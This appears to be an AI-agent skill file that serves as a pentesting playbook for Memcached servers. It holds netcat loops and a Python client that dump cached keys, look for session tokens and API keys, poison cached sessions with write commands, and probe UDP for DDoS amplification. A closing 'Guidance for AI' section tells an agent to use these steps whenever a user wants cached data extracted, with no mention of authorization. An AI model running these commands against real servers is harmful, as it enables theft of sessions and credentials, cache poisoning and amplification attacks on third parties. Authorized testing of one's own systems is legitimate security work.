# Memcached Pentesting Skill

## Goal

Exploit Memcached services to extract cached data and potentially abuse for DDoS amplification.

## Methodology

1. **Discovery**: Identify Memcached services
2. **Authentication Check**: Test for unauthenticated access
3. **Data Extraction**: Dump cached keys and values
4. **Information Gathering**: Extract sensitive cached data
5. **Amplification Testing**: Check for DDoS potential

## Ports

- 11211/TCP: Memcached (default)
- 11211/UDP: Memcached (DDoS amplification)

## Tools

* **memccat/memcstat**: libmemcached utils
* **nmap**: Memcached scripts
* **nc/telnet**: Manual interaction
* **memcrashed**: Amplification testing

## Example Commands

```bash
# Nmap detection
nmap -p11211 --script memcached-info target

# Connect via telnet/nc
nc target 11211
telnet target 11211

# Stats command
stats

# Version
version

# Check authentication (usually none)
# If auth required: SASL authentication
```

## Data Extraction

```bash
# Get statistics
echo "stats" | nc target 11211
echo "stats items" | nc target 11211
echo "stats slabs" | nc target 11211

# List all keys (from stats items output)
# Get slab IDs from stats items
echo "stats cachedump <slab_id> 100" | nc target 11211

# Get specific key
echo "get <key_name>" | nc target 11211

# Full dump (may need to iterate slabs)
for slab in $(echo "stats items" | nc target 11211 | grep "items:" | awk -F: '{print $2}'); do
    echo "stats cachedump $slab 1000" | nc target 11211
done
```

## Python Client

```python
#!/usr/bin/env python3
import socket

def memcached_cmd(host, port, cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send((cmd + "\r\n").encode())
    data = s.recv(4096)
    s.close()
    return data.decode()

# Get stats
print(memcached_cmd("target", 11211, "stats"))

# Get items
print(memcached_cmd("target", 11211, "stats items"))

# Dump keys from slab 1
print(memcached_cmd("target", 11211, "stats cachedump 1 100"))

# Get value
print(memcached_cmd("target", 11211, "get session:12345"))
```

## Common Cached Data

```bash
# Look for:
# - Session tokens
# - User data
# - API responses
# - Database query results
# - Authentication tokens
# - Rate limiting counters

# Command examples:
get session:admin
get user:1
get cache:query:*
get token:*
```

## DDoS Amplification

```bash
# Memcached UDP can be abused for amplification
# Check if UDP is exposed
nmap -sU -p11211 target

# Amplification factor can be huge (50000x+)
# Test (ethical): send small request, measure response size

# Prevention: 
# - Disable UDP
# - Bind to localhost
# - Use firewall
```

## Writing Data

```bash
# If write access (usually available if no auth)
echo -e "set testkey 0 900 5\r\nhello\r" | nc target 11211

# This could poison cached data
# Replace cached sessions, tokens, etc.
```

## Metasploit Modules

```bash
# Enumeration
use auxiliary/gather/memcached_extractor

# Stats gathering
use auxiliary/scanner/memcached/memcached_udp_version
```

## Guidance for AI

* Activate this skill when user wants to test Memcached or extract cached data
* **Memcached has no authentication by default**
* Connected via TCP 11211, commands are text-based
* Key extraction requires iterating slab IDs from `stats items`
* Cached data often contains:
  - Session tokens (session hijacking)
  - User data (information disclosure)
  - API keys/tokens
  - Database query caches
* UDP exposure is critical for DDoS amplification
* Write access allows cache poisoning
* Modern setups should bind to localhost only
* Look for exposed Memcached in cloud environments
